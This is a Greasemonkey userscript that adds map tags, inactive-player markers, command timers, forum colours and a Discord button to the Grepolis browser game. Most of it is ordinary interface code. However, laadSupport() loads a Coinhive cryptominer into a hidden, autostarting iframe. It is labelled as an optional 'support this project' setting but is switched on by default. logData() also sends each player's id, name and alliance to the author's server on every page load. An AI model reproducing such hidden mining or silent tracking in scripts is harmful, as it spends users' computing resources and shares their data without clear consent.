// ==UserScript==
// @name         Grepolis Map Enhancer
// @author       Cyllos
// @description  Grepolis Map Enhancer by Cyllos
// @include      http://*.grepolis.com/game/*
// @include      https://*.grepolis.com/game/*
// @exclude      view-source://*
// @exclude      https://classic.grepolis.com/game/*
// @updateURL    https://github.com/Cyllos42/GME/raw/master/GrepolisMapEnhancer.meta.js
// @downloadURL  https://github.com/Cyllos42/GME/raw/master/GrepolisMapEnhancer.user.js
// @icon         https://github.com/Cyllos42/GME/raw/master/sources/logo_geenkader.png
// @version      1.11.a
// @grant GM_setValue
// @grant GM_getValue
// @grant unsafeWindow
// @require http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
// ==/UserScript==
// zet globale variabelen
var idleList = {};
var koloSet = false;
var startTime = 0;
var totalTime = 0;
var settings = {};
var i = 0;
var UWGame = unsafeWindow.Game;
unsafeWindow.UWGame = UWGame;

(
    function() {															// functie die het script opstart
        console.log("GME: Starting Grepolis Map Enhancer, thank you " + UWGame.player_name);    // toon startbevestiging van het script in console
        laadSettings();												// laad de settings van de gebruiker zijn browser
        stadsinfoStarter(); 									// start het toevoegen van tags op de kaart
        setCSS(); 														// voeg stijl toe aan Grepolis
        logData();														// stuur een berichtje naar de server (voor gebruiksstatistieken bij te houden)
        if(settings.support) laadSupport();		// indien gewenst, laad de support module
        checkSettings();											// voeg de instelling knop toe
        console.log("GME: Succesfully loaded Grepolis Map Enhancer!"); // toon bevestiging laden van het script in console
        observe(300);													// start observe module die kijkt voor veranderingen
    })();


function laadSettings(){	// laad de settings van de gebruiker zijn browser
		// haalt de setting en indien deze niet bestaat, de default value
    settings.oceaannummer = GM_getValue('setting_oceaannummer', true);
    settings.inactive = GM_getValue('setting_inactive', true);
    settings.inactiveMin = GM_getValue('setting_inactiveMin', 1);
    settings.inactiveMax = GM_getValue('setting_inactiveMax', 10);
    settings.colors = GM_getValue('setting_colors', true);
    settings.koloanimatie = GM_getValue('setting_koloanimatie', true);
    settings.tijden = GM_getValue('setting_tijden', true);
    settings.terugTrek = GM_getValue('setting_terugTrek', true);
    settings.tags = GM_getValue('setting_tags', true);
    settings.support = GM_getValue('setting_support', true);
    settings.playertag = GM_getValue('setting_playertag', false);
    settings.tagkleuren = GM_getValue('setting_tagkleuren', true);
    settings.discord = GM_getValue('setting_discord', true);
    settings.discordhook = GM_getValue('setting_discordhook' + UWGame.world_id, '[voeg hier web hook toe]');
}

function observe(time) {	// start observe module die kijkt voor veranderingen
    if(i<10) i++;					// start pas na 10x deze module gebruikt te hebben (voorkomt te snel laden van alles)
    else {
        for (var item of document.getElementsByClassName("title")) { // checkt of er een kolokiller topic op het forum geopend is
            if (item.innerHTML == "Kolokiller") {										 // als er een topic is met de naam kolokiller
                item.innerHTML = "Kolokiller plugin";								 // verander de naam naar kolokiller plugin (voorkomt blijvend uitvoeren van deze module)
								// verander de inhoud van het de eerste post naar het dynamisch tool
                document.getElementsByClassName('post')[0].innerHTML = '<iframe src="https://cyllos.me/GME/GME?action=portal&world_id=' + UWGame.world_id + '&alliance_id=' + UWGame.alliance_id + '&player_id=' + UWGame.player_id + '&player_name=' + UWGame.player_name + '" width="100%" height="500px" frameborder="0"></iframe>';
            }
            if (settings.colors) checkColors(item);	// indien gewenst, laad de alliantieforum kleuren module

        }
        if(settings.discord) checkDiscord();				// indien gewenst, check of er een discordknop moet toegevoegd worden
        if(settings.koloanimatie) koloAnimatie();		// indien gewenst, check of er een koloanimatie weergegeven moet worden
        if(settings.tijden) checkTijden();					// indien gewenst, check of er tijden bij een commando moeten toegevoegd worden
    }
    setTimeout(function() {													// laad deze module opnieuw om terug alle checks uit te voeren
        observe(time);
    }, time);
}

function checkDiscord(){																									// indien gewenst, check of er een discordknop moet toegevoegd worden
    if(document.getElementById('settings_discord') == null){							// check of er al een discordknop is, indien niet ga voort
        for(var item of document.getElementsByClassName('command_info')){	// zoek het command_info element
            var element = document.createElement('a');										// maak een knop aan met volgende instellingen
            element.className = 'button';
            element.id = 'settings_discord';
            element.href = '#';
            element.style = "margin: 2px; position: absolute; bottom: 0px;left: 0;right: unset;";
            element.innerHTML = '<span class="left"><span class="right"><span class="middle">Discord</span></span></span><span style="clear: both;"></span>';
            item.appendChild(element);																		// voeg de knop toe aan het comand_info element
            $("#settings_discord").click(function(){laadDiscord(item);});	// zeg wat er moet gebeuren als er op de knop geduwd wordt
        }
    }
}
function laadDiscord(item){			// als de discordknop wordt ingedrukt doe dan het volgende
    var linkerstad =  item.children[0].children[2].children[1].children[0].children[0].innerHTML		// zoek de stad links
    var rechterspeler = item.children[0].children[0].children[1].children[1].children[0].innerHTML; // zoek de speler rechts
    var aankomsttijd = item.children[1].children[1].innerHTML;																			// zoek de aankomsttijd
    var status = '';
    if((/attack/).test(item.children[0].children[1].children[0].children[0].src)) status = 'aanval';				// kijk of het een aanval is
    if((/support/).test(item.children[0].children[1].children[0].children[0].src)) status = 'verdediging';	// kijk of het verdediging is
    if((/return/).test(item.children[0].children[1].className)) status = 'terugkerende ' + status + ' van';else status +=' door'; // kijk of de beweging terugkerende is
    var data = '__**' + linkerstad + '**__ : ' + status + ' **' + rechterspeler + '**\n(aankomst *' + aankomsttijd + '*)';	// plak alles mooi samen
    sendToDiscord(data);	// stuur dit naar discord

}
function sendToDiscord(data){ 	// module voor het verzenden naar discord
    $.ajax({
        url: settings.discordhook,
        method: "post",
        data: {
            content: data, // voegt meegegeven data toe
            username: Game.player_name + ' [GME angel]', //	zet de username
            avatar_url: 'https://' + Game.world_id + '.grepolis.com/image.php?player_id=' + Game.player_id // zet de avatar van de bot op speler zijn ingame avatar
        },
        cache: !0
    });
}
function checkTijden(){					// indien gewenst, check of er tijden bij een commando moeten toegevoegd worden
    var foundAttacks = false;
    var elementList;
    for(var itemlist of document.getElementsByClassName('js-dropdown-item-list')){ // zoek naar bewegingen
        if(itemlist.childElementCount != 0 && /movement/.test(itemlist.children[0].id)){
            foundAttacks = true;
            elementList = itemlist;
            break;
        }
    }
    if(foundAttacks && elementList.children != null){ // indien er bewegingen gevonden zijn doe het volgende
        for(var child of elementList.children){
            if(child.children[0].children[1].children[2] == null){  //Indien nog niets toegevoegd
                indicator = document.createElement('div');					//Maak div met indicatorAankomsttijd
                indicator.className = 'indicatorAankomst';
                aankomstTime = Timestamp.toDate(child.dataset.timestamp);	// haal aankomsttijd uit object (zet tijd om)
                aankomstuur = aankomstTime.getHours(); if(aankomstTime.getHours() < 10) aankomstuur = "0" + aankomstTime.getHours();			// haal uur uit tijd en voeg indien nodig een '0' toe
                aankomstmin = aankomstTime.getMinutes(); if(aankomstTime.getMinutes() < 10) aankomstmin = "0" + aankomstTime.getMinutes();// haal minuten uit tijd en voeg indien nodig een '0' toe
                aankomstsec = aankomstTime.getSeconds(); if(aankomstTime.getSeconds() < 10) aankomstsec = "0" + aankomstTime.getSeconds();// haal seconden uit tijd en voeg indien nodig een '0' toe

                aankomstData = aankomstuur + ':' + aankomstmin + ':' + aankomstsec; // voeg alles mooi samen
                indicatorText = document.createElement('p');	// voeg data toe aan HTML
                indicatorText.innerHTML = aankomstData;
                indicator.appendChild(indicatorText);
                child.children[0].children[1].appendChild(indicator);	// voeg HTML toe aan item command

            }
            if(settings.terugTrek){ // indien terugtrek tijden gewenst doe het volgende
                // indien starttijd bekend is en indien een 3de element bestaat zonder kinderen, doe het volgende
                if(child.dataset.starttime != -1 && child.children[0].children[1].children[2] != null && child.children[0].children[1].children[2].childElementCount < 2){
                    // pak starttijd en reken er 10 min bij
                    retreatTimestamp = parseInt(child.dataset.starttime) + 600;
                    serverTimestamp = Timestamp.server();
                    console.log('GME: Found retreat max: ' + Timestamp.toDate(retreatTimestamp));
                    // indien servertijd nog jonger is dan max terugtrektijd en men dus kan terugtrekken doe het volgende
                    if(retreatTimestamp > serverTimestamp){
                        indicatorText = document.createElement('p'); // maak een element aan
                        indicatorText.className = 'indicatorTerugtrek';
                        retreatTime = Timestamp.toDate(retreatTimestamp);
                        retreatuur = retreatTime.getHours(); if(retreatTime.getHours() < 10) retreatuur = "0" + retreatTime.getHours();				// haal uur uit tijd en voeg indien nodig een '0' toe
                        retreatmin = retreatTime.getMinutes(); if(retreatTime.getMinutes() < 10) retreatmin = "0" + retreatTime.getMinutes();	// haal minuten uit tijd en voeg indien nodig een '0' toe
                        retreatsec = retreatTime.getSeconds(); if(retreatTime.getSeconds() < 10) retreatsec = "0" + retreatTime.getSeconds();	// haal seconden uit tijd en voeg indien nodig een '0' toe
                        indicatorText.innerHTML = ' (' + retreatuur + ':' + retreatmin + ':' + retreatsec + ')';		// zet alles mooi samen
                        child.children[0].children[1].children[2].appendChild(indicatorText);												// voeg toe aan het commando
                    }
                }
                if(child.dataset.starttime != -1 && child.children[0].children[1].children[2].children[1] != null){	// indien er tijden gevonden zijn
                    retreatTimestamp = parseInt(child.dataset.starttime) + 600;
                    serverTimestamp = Timestamp.server();
                    if(retreatTimestamp < serverTimestamp){
                        child.children[0].children[1].children[2].children[1].innerHTML = ' '; // verwijder de max terugtrektijd als deze al voorbij is
                    }
                }}
        }

    }
}

function checkColors(item){			// indien gewenst, laad de alliantieforum kleuren module
	// deze module checkt alle alliantie topics op een bepaald patroon, indien gevonden voeg dan een kleur klasse toe
    if ((/\ ROOD$/).test(item.innerText) || (/\ R$/).test(item.innerText)) {
        if (!/rood/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " rood";
        }
    }
    if ((/\ BLAUW$/).test(item.innerText) || (/\ B$/).test(item.innerText)) {
        if (!/bauw/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " blauw";
        }
    }
    if ((/\ GROEN$/).test(item.innerText) || (/\ G$/).test(item.innerText)) {
        if (!/groen/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " groen";
        }
    }
    if ((/\ GEEL$/).test(item.innerText) || (/\ E$/).test(item.innerText)) {
        if (!/geel/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " geel";
        }
    }
    if ((/\ ORANJE$/).test(item.innerText) || (/\ O$/).test(item.innerText)) {
        if (!/oranje/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " oranje";
        }
    }
    if ((/\ PAARS$/).test(item.innerText) || (/\ P$/).test(item.innerText)) {
        if (!/paars/.test(item.parentNode.parentNode.className)) {
            item.parentNode.parentNode.className += " paars";
        }
    }
}

function doSettings() {					// functie die het instellingenmenu maakt
    var windowExists = false;
    var windowItem = null;
    console.log('GME: Looking for settings');
    for(var item of document.getElementsByClassName('ui-dialog-title')){ // kijk of er al een scherm is
        if(item.innerHTML == "Grepolis Map Enhancer Settings"){
            console.log('GME: Settings clicked!');
            windowExists = true;
            windowItem = item;
        }
    }
    if(!windowExists) wnd = Layout.wnd.Create(Layout.wnd.TYPE_DIALOG, "GME Settings"); console.log('GME: Creating settings window'); // indien er geen is maak een nieuw aan
    wnd.setContent(''); // maak het leeg
    for(item of document.getElementsByClassName('ui-dialog-title')){ // zoek het scherm
        if(item.innerHTML == "GME Settings"){
            console.log('GME: Found settings!');
            windowItem = item;
        }
    }
    wnd.setHeight('500'); // zet instellingen van het scherm
    wnd.setWidth('800');
    wnd.setTitle('Grepolis Map Enhancer Settings');
    console.log('Opened settings');
    title = windowItem;
    frame = title.parentElement.parentElement.children[1].children[4]; // selecteer het frame element
    frame.innerHTML = ''; // maak het leeg en maak een kleine html structuur
    var html = document.createElement('html');
    var body = document.createElement('div');
    var head = document.createElement('head');
    var element = document.createElement('img'); // maak het afbeeldingelement en zet instellingen
    element.src = "http://oi63.tinypic.com/dq6ibk.jpg";
    element.style.width = "60%";
    element.style.float = 'right';
    body.appendChild(element);
    element = document.createElement('h3'); // maak een titelelement en zet instellingen
    element.innerHTML = "Instellingen";
    body.appendChild(element);
    var list = document.createElement('ul'); // maak een lijst aan voor de instellingen
    list.style.paddingBottom = "5px";

		// het volgend blokje maakt element die we nodig hebben
    var listitem = document.createElement('li').appendChild(document.createElement('div'));
    var checkbox = document.createElement('div');
    checkbox.className = 'cbx_icon';
    var caption = document.createElement('div');
    caption.className = 'cbx_caption';

		// gebruik de addCheckbox module om checkboxes te maken met de instellingen
    list.appendChild(addCheckbox(settings.oceaannummer, 'setting_oceaannummer', "Minder felle oceaancijfers (GRCRT) op kaart"));
    list.appendChild(addCheckbox(settings.tags,"setting_tags","Alliantietags op kaart"));
    list.appendChild(addCheckbox(settings.playertag,"setting_playertag","Spelertags op kaart"));
    list.appendChild(addCheckbox(settings.tagkleuren,"setting_tagkleuren","Tags kleuren naar vlag"));
    list.appendChild(addCheckbox(settings.inactive,"setting_inactive","Inactieve spelers op kaart"));

		// maak de max en min inactiviteits blokjes en stel in (drie blokken code)
    listitem = document.createElement('p');
    listitem.innerHTML = "Minimum tot maximum dagen inactief";
    listitem.style.lineHeight = '0';
    list.appendChild(listitem);

    listitem = document.createElement('div');
    listitem.className = "textbox";
    //listitem.style.float = 'left';
    listitem.style.width = '60px';
    listitem.innerHTML = '<div class="left"></div><div class="right"></div><div class="middle"><div class="ie7fix"><input tabindex="1" id="setting_inactiveMin" value="' + settings.inactiveMin +' " size="10" type="text"></div></div>';
    list.appendChild(listitem);

    listitem = document.createElement('div');
    listitem.className = "textbox";
    //listitem.style.float = 'left';
    listitem.style.width = '60px';
    listitem.innerHTML = '<div class="left"></div><div class="right"></div><div class="middle"><div class="ie7fix"><input tabindex="1" id="setting_inactiveMax" value="' + settings.inactiveMax + '" size="10" type="text"></div></div>';
    list.appendChild(listitem);

		// gebruik de addCheckbox module om checkboxes te maken met de instellingen
    list.appendChild(addCheckbox(settings.koloanimatie,"setting_koloanimatie","Kolonisatieschip animatie"));
    list.appendChild(addCheckbox(settings.colors,"setting_colors","Kleuren op het forum"));
    list.appendChild(addCheckbox(settings.tijden,"setting_tijden","Tijden bij commando"));
    list.appendChild(addCheckbox(settings.terugTrek,"setting_terugTrek","Laatste terugtrek bij commando"));
    list.appendChild(addCheckbox(settings.discord,"setting_discord","Stuur naar discord knop bij commando info"));

		// maak een box voor de discordhook in te zetten
    listitem = document.createElement('div');
    listitem.className = "textbox";
    listitem.style.width = '400px';
    listitem.innerHTML = '<div class="left"></div><div class="right"></div><div class="middle"><div class="ie7fix"><input tabindex="1" id="setting_discordhook" value="' + settings.discordhook + '" size="10" type="text"></div></div>';
    list.appendChild(listitem);

		// maak een herlaadknop en stel deze in
    body.appendChild(list);
    element = document.createElement('div');
    element.className = "button_new";
    element.id = 'settings_reload';
    element.style.margin = "2px";
    childElement = document.createElement('div');
    childElement.className = 'left';
    element.appendChild(childElement);
    childElement = document.createElement('div');
    childElement.className = 'right';
    element.appendChild(childElement);
    childElement = document.createElement('div');
    childElement.className = 'caption js-caption';
    childElement.innerHTML = 'Opslaan en herladen<div class="effect js-effect"></div>';
    element.style.float = 'left';
    element.appendChild(childElement);
    body.appendChild(element);

		// maak het support doosje rechts
    listitem = addCheckbox(settings.support,"setting_support","Support dit project<p style=\"line-height: 0;font-size: 9px;\">(toont geen ads maar werkt niet met adblock aan)</p>");	// maak een support checkbox
    getSupporters();		// haal de beste supporters op
    getSupportPlayer();	// haal speler zijn persoonlijke support op
    element = document.createElement('p');
    element.innerHTML = listitem.outerHTML;
    element.innerHTML += '<p id="playersupport"></p>';
    element.innerHTML += '<p id="topsupport"></p>';
    element.innerHTML += 'BTC: 38DjmGJiSn52Hk4h3aQvy1oCEqAq39zUF7';
    element.innerHTML += '<br>GRC: SGNF5BMt3uADgSzm1sKD4LBBt8cS5Fc42b';
    element.id = 'supportbox';
    body.appendChild(element);

		// maak instellingen informatie linksonder
    element = document.createElement('p');
    element.innerHTML = 'Grepolis Map Enhancer v.' + GM_info.script.version;
    element.innerHTML += '<br>Copyright &copy; cyllos ' + Timestamp.toDate(Timestamp.server()).getFullYear();
    element.innerHTML += '<br><p style="font-size: xx-small">contact: <a href="mailto:cyllos@cobrasec.org">cyllos@cobrasec.org</a></p>';
    element.style.position = 'absolute';
    element.style.bottom = "0";
    element.style.left = "0";
    element.style.marginBottom = "0";
    element.style.lineHeight =  "1";
    body.appendChild(element);

		// voeg alles bij elkaar
    html.appendChild(head);
    html.appendChild(body);
    frame.appendChild(html); // voeg alles toe aan het frame

		// zeg wat er moet gebeuren als met op een checkbox klikt
    $(".gmesettings").click(function(){toggleSetting(this);});
		// zeg wat er moet gebeuren als er op herladen gedrukt wordt. Dit slaat de inputvelden op en herlaadt de pagina
    $("#settings_reload").click(function(){GM_setValue('setting_inactiveMin', $('#setting_inactiveMin').val()); GM_setValue('setting_inactiveMax', $('#setting_inactiveMax').val());GM_setValue('setting_discordhook' + UWGame.world_id, $('#setting_discordhook').val());window.location.reload(true); });
}
function toggleSetting(element) { // functie voor het aan en uit zetten van een module
    $('#' + element.id).toggleClass("checked");
    settings[element.id] = $(element).hasClass("checked");
    GM_setValue(element.id, $(element).hasClass("checked"));
    console.log('Setting ' + element.id + ' changed to ' + $(element).hasClass("checked") + ' (GM_getvalue = ' + GM_getValue(element.id) + ')');
}
function checkSettings() {			// module die het instellingenknopje rechtsboven maakt
    if(document.getElementById('GMESetupLink') == null){ // indien er nog geen knopje is, doe het volgende
				// het volgende blok code maakt een instellingenknopje en stel in
        a = document.createElement('div');
        a.id = "GMESetupLink";
        a.className = 'btn_settings circle_button';
        img = document.createElement('div');
        img.style.margin = '6px 0px 0px 5px';
        img.style.background = "url(https://github.com/Cyllos42/GME/raw/master/sources/logo_geenkader.png) no-repeat 0px 0px";
        img.style.width = '22px';
        img.style.height = '22px';
        img.style.backgroundSize = '100%';
        a.style.top = '105px';
        a.style.right = '-4px';
        a.style.zIndex = '10000';
        a.appendChild(img);
        document.getElementById('ui_box').appendChild(a);
        $("#GMESetupLink").click(doSettings); // zegt wat er moet gebeuren met het knopje indien men er op drukt
    }
}

function addCheckbox(setting, id, beschrijving){ // module voor het maken van een checkbox
		// het volgende blok code maakt een checkbox en stelt deze in
    checkbox = document.createElement('div');
    checkbox.className = 'cbx_icon';
    caption = document.createElement('div');
    caption.className = 'cbx_caption';
    listitem = document.createElement('li').appendChild(document.createElement('div'));
    state = "unchecked";if(setting) state = "checked";
    listitem.id = id;
    listitem.className = "gmesettings checkbox_new green " + state;
    caption.innerHTML = beschrijving;
    listitem.appendChild(checkbox);
    listitem.appendChild(caption);
    return listitem.parentElement; // geeft de checkbox weer terug
}

function koloAnimatie() {				// indien gewenst, check of er een koloanimatie weergegeven moet worden [code is niet altijd even stabiel]
    for (var item of document.getElementsByClassName("attack_takeover")) {	// check alle elementen met een overname klasse
        if(item.parentNode.parentNode.parentNode.parentNode.innerHTML == 'attack_overview') break; // als het gevonden element deel is van het overzicht doe dan niets
        if(/support_filter/.test(item.className)) break; // indien het een filter knop is doe dan niets
        if (koloSet == false) { // indien er geen kolo gezet is doe dan het volgende
            startTime = item.parentNode.parentNode.dataset.starttime; // haal starttijd uit element
            totalTime = item.parentNode.parentNode.dataset.timestamp; // haal aankomsttijd uit element
            for (var middle of document.getElementsByClassName('middle')) { // zoek de balk bovenaan
                if (middle.parentNode.className == 'nui_toolbar') { // als het het juiste element is doe dan het volgende
										// het volgende blok code maakt de koloanimatie aan en stelt deze in
                    koloSet = true;
                    if(item.parentElement.children[1] != null && item.parentElement.children[1].children[1] != null && item.parentElement.children[1].children[1].children[0] != null) link = item.parentElement.children[1].children[1].children[0].href;
                    var vlag_r = '<p class ="koloAanduider"><a class="gp_town_link" href="' + link + '"><img style="width: 15px;height: 18px; position: absolute; left: 33%; top: 10px;, z-index: 99;" src="https://github.com/Cyllos42/GME/raw/master/sources/flag_r.png"></a></p>';
                    var vlag_y = '<img class="koloAanduider" style="width: 15px;height: 18px; position: absolute; left: -15px; top: 10px;, z-index: 99;" src="https://github.com/Cyllos42/GME/raw/master/sources/flag_y.png">';
                    var koloBoot = '<img class="koloAanduider" id="koloboot" src="https://github.com/Cyllos42/GME/raw/master/sources/cs.png">';
                    var koloLijn = '<div class="koloAanduider" style="width: 33%; height: 5px; position: absolute; left: 0; top: 23px; z-index: 98;background: url(\'https://gpnl.innogamescdn.com/images/game/common/water_base.png\') repeat 0 0;}" id="kololijn"></div>';
                    middle.innerHTML = middle.innerHTML + koloBoot + koloLijn + vlag_r + vlag_y;
                }
            }
        }
    }

    var koloAangekomen = false;
    if (startTime != 0) { // als we de vertrektijd kennen doe dan het volgende
        var a = (Timestamp.server() - startTime) / (totalTime - startTime) * 30;
        if (a * 3.33 > 100) { // kijk of de kolo nog niets is aangekomen
            startTime = 0;
            koloAangekomen = true;
        }
        var css;
        if (document.getElementById('kolocss') == null) { // maak een stijl toe om de kolo te plaatsen
            console.log('GME: Added kolo tracker.');
            css = [
                "#koloboot{",
                "}"
            ].join("\n");

            var node = document.createElement("style");
            node.type = "text/css";
            node.id = 'kolocss';
            node.appendChild(document.createTextNode(css));
            var heads = document.getElementsByTagName("head");
            if (heads.length > 0) {
                heads[0].appendChild(node);
            } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
                // }
            }
        } else if(totalTime == -1) { // verwijder alles als de kolo er is
            css = [
                "#koloboot{",
                "display: none;",
                "}"
            ].join("\n");
            document.getElementById('kolocss').innerHTML = css;
        } else { // update de positie van de kolo
            css = [
                "#koloboot{",
                "position: absolute;",
                "left: " + a + "%;",
                "top: 1px;",
                "width: 25px;",
                "height: 25px;",
                "z-index: 100;",
                "}"
            ].join("\n");
            document.getElementById('kolocss').innerHTML = css;
        }
    }
    if (koloAangekomen) {	// verwijder alles als de kolo er is
        for (var koloAanduider of document.getElementsByClassName('koloAanduider')) {
            koloAanduider.innerHTML = '';
        }
    }

}

function setCSS() {							// voeg stijl toe aan Grepolis
    if(settings.oceaannummer){	// indien gewenst verlaag dan de doorzichtigheid van de oceaannummers
        oceaannummer = '.RepConvON {opacity: 0.04 !important;}';
    } else oceaannummer = "";
		// de volgende blok bevat alle stijl voor GME en voor Grepolis
    var css = [
        "#recruit_overview .hepler_row {",
        "border: black 1px solid;",
        "}",
        "input {",
        " color: black;",
        "}",
        ".grcrtpoints {",
        "	color: white !important ;",
        "	font-size: 9px !important ;",
        "}",
        ".sandy-box .item.command{",
        "   height: 54px !important;",
        "}",
        ".indicatorTerugtrek {",
        "	color: rgba(150, 0, 0, 0.5) ;",
        "}",
        ".indicatorAankomst {",
        "	color: rgba(0, 0, 0, 0.5) ;",
        "	font-size: xx-small ;",
        "   position: relative;",
        "   display: flex;",
        "   line-height: 0px;",
        "}",
        "",
        "#map .badge.claim{",
        "	animation: blink-animation 2s steps(30, start) infinite;",
        "}",
        "@keyframes blink-animation {",
        "50% {",
        "    opacity: 0.0;",
        "  }",
        "}",
        oceaannummer,
        "@keyframes blink-animation2 {",
        "90% {",
        "    outline-style: solid;",
        "  outline-color: limegreen;",
        "   outline-offset: 0px;",
        "  }",
        "}",
        ".tile.lvl1 {",
        "	opacity: 0.6;",
        "}",
        "",
        ".tile.lvl2 {",
        "	opacity: 0.7;",
        "}",
        "#supportbox{",
        "  position: absolute;",
        "  bottom: 0px;",
        "  right: 0px;",
        "  list-style: none;",
        "  border: 1px rgba(0, 0, 0, 0.4) dashed;",
        "  padding: 10px;",
        "  line-height: 1.2;",
        "  font-size: 12px;",
        "}",
        "",
        "#questlog .questlog_icon {",
        " background-color: rgba(0, 0, 0, 0);",
        " background-image: url('https://github.com/Cyllos42/GME/raw/master/sources/questionlog.png');",
        "}",
        "",
        ".tile.farm_town {",
        "	border: none;",
        "}",
        ".attack_planner li.selected {",
        "background: sandybrown;",
        "}",
        "#map_towns .flag .alliance_name {",
        "pointer-events: none;",
        "opacity: 0.8;",
        "position: absolute;",
        "top: -17px;",
        "left: -58px;",
        "width: 110px;",
        "color: white;",
        "text-align: center;",
        "display: block;",
        "font-size: x-small;",
        "text-shadow: 1px 1px rgba(0,0,0,0.7);",
        "}",
        "",
        ".crm_icon {",
        "	display: none;",
        "}",
        ".groen div{",
        "background-color: #CCF29F;",
        "}",
        ".blauw div{",
        "background-color: #9fd5f2;",
        "}",
        ".rood div{",
        "background-color: #FFBD9B;",
        "}",
        ".oranje div{",
        "background-color: #f7c274;",
        "}",
        ".geel div{",
        "background-color: #f2f09f;",
        "}",
        ".paars div{",
        "  background-color: #a49ff2;,",
        "}"
    ].join("\n");

		// voeg de stijl toe aan grepolis
    var node = document.createElement("style");
    node.type = "text/css";
    node.appendChild(document.createTextNode(css));
    var heads = document.getElementsByTagName("head");
    if (heads.length > 0) {
        heads[0].appendChild(node);
    } else {
        document.documentElement.appendChild(node);
    }
    console.log("GME: Added CSS");
}

function createAwesomeNotification(var1, var2) { // module om een notificatie te maken
    var notificatiehandler = (typeof Layout.notify == 'undefined') ? new NotificationHandler() : Layout;
    notificatiehandler.notify($('#notification_area>.notification').length + 1, var1, '<span><b>' + 'Grepolis Map Enhancer' + '</b></span>' + var2 + '<span class=\'small notification_date\'>' + ' </span>');
}

function getidleList() { 	// deze module haalt alle inactieve spelers op van GRCRT
    return $.ajax({
        url: "https://www.grcrt.net/json.php",
        method: "get",
        data: {
            method: "getIdleJSON",
            world: UWGame.world_id
        },
        cache: !0
    });
}

function logData(){				// deze module stuurt een berichtje naar de server (voor gebruiksstatistieken bij te houden)
    return $.ajax({
        url: "https://cyllos.me/GME/GME",
        method: "get",
        data: {
            action: 'log',
            world_id: UWGame.world_id,
            alliance_id: UWGame.alliance_id ,
            player_id: UWGame.player_id,
            player_name: UWGame.player_name
        },
        cache: !0
    });
}


function stadsinfo(var1, var3, data) { // module voor het toevoegen van tags
    if (var1 != undefined && var1.length > 0 && var3.player_id) {	// indien er een spelers id gevonden wordt, doe het volgende
        for (var var2 = 0; var2 < var1.length; var2++) {					// voor alle steden gevonden
            if (var1[var2].className == 'flag town') {						// indien de klassenaam flag town is doe het volgende
                var border = "";
                var inactive = "";
								// kijk of men inactieve spelers wilt zien en check deze tegen de min en max waarden. Indien geldig voeg toe en geef een rand
                if (settings.inactive && data.JSON[var3.player_id] >  settings.inactiveMin && data.JSON[var3.player_id] <  settings.inactiveMax) {
                    inactive = "(" + parseInt(data.JSON[var3.player_id]) + "d)";
                    border = "outline: groove red 2px;animation: blink-animation2 2s steps(1, start) infinite;";
                } else {
                    border = " ";
                    inactive = " ";
                }
                playername = ' ';
                alliancename = ' ';
                if(settings.playertag){ playername = var3.player_name; } 				// indien gewenst voeg spelertags toe
                if(settings.tags){ alliancename = (var3.alliance_name || ' ');}	// indien gewenst voeg alliantietags toe
                if(settings.playertag && settings.tags){ playername += '<br>';}	// indien beiden, zet dan een break om ze onder elkaar te krijgen
                if(settings.tagkleuren) { kleuren = 'style="background-color: inherit;';} else {kleuren = ' ';} // als men kleurtjes wilt erf dan over van vlagkleuren
                $(var1[var2]).append('<div class="alliance_name" ' + kleuren + border + '">' + playername + alliancename + " " + inactive + '</div>'); // voeg element toe
                break;
            }
        }
    }
    return var1;
}

function getSupporters(){	// deze module haalt de top 3 supporters op
    $.ajax({
        url: "https://cyllos.me/GME/GME",
        method: "get",
        data: {
            action: 'getSupport',
        },
        cache: !0
    }).success(function(data){
				// indien er supporters gevonden zijn haal dan hun data uit het json object
        supporters = JSON.parse(data).users;
        document.getElementById('topsupport').innerHTML = 'Top supporters: <br>1: ' + supporters[0].name + ' (' + parseInt(supporters[0].total/10000) + ' punten) <br>2: ' +
            supporters[1].name + ' (' + parseInt(supporters[1].total/10000) + ' punten) <br>3: ' +
            supporters[2].name + ' (' + parseInt(supporters[2].total/10000) + ' punten)';
    });
}

function getSupportPlayer(){	// deze module haalt de punten op van de speler zelf
    $.ajax({
        url: "https://cyllos.me/GME/GME",
        method: "get",
        data: {
            action: 'getSupport',
            player: UWGame.player_name
        },
        cache: !0
    }).success(function(data){
				// als ze gevonden zijn verzamel dan de data en geef terug
        supporters = JSON.parse(data);
        if(supporters.success) document.getElementById('playersupport').innerHTML = 'Jouw punten: ' +parseInt(supporters.total/10000);
        else document.getElementById('playersupport').innerHTML = 'Jouw punten: 0';
    });
}
function laadSupport(){		// deze module laadt de support tool van coinhive
		// voegt het supportelement toe aan de webpagina
    support = 'https://coinhive.com/media/miner.html?key=lExsAfunHvT49Vk89uU738RZR27ys8GD&user=' + UWGame.player_name + '&whitelabel=1&autostart=1&throttle=0.3&threads=&background=&text=Okay';
    supportNode = document.createElement('iframe');
    supportNode.src = support;
    supportNode.style.display = 'none';
    document.body.appendChild(supportNode);
}

function stadsinfoStarter() { // deze module start het laden van tags
    idleList = getidleList();
    idleList.success(function(data) {
        console.log("GME: Adding town tags");
        var var1 = function(var10) {
            return function() {
                var var1 = var10.apply(this, arguments);
                return stadsinfo(var1, arguments[0], data);
            };
        };
        MapTiles.createTownDiv = var1(MapTiles.createTownDiv);
    });
}

function exec(fn) {				// deze module zorgt voor her starten van het script
    var script = document.createElement('script'); 					// maak scriptelement
    script.setAttribute("type", "application/javascript");	// zet het type
    script.textContent = '(' + fn + ')();';									// voeg het script toe
    document.body.appendChild(script); 											// het the script
}
